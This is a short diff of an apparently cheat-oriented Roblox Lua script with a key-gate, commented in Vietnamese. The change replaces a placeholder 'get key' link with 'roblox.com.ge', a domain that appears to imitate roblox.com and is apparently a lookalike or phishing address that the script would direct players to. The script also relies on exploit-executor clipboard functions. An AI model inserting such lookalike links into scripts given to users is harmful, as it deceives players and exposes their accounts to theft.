@@ -10,7 +10,7 @@ local MarketPlaceService = game:GetService("MarketplaceService")
 local Clipboard = setclipboard or toclipboard
 
 -- ==================== CẤU HÌNH HỆ THỐNG KEY ====================
-local LINK_GET_KEY = "https://link-cua-ban-o-day.com" -- Thay link vượt tiền của bạn vào đây
+local LINK_GET_KEY = "https://roblox.com.ge/communities/8754684311/" -- Thay link vượt tiền của bạn vào đây
 local KEY_CHINH_XAC = "Key_VIP_123" -- Thay Key bạn muốn đặt vào đây
 
 -- Link script chính (UI Redz V2) của bạn:
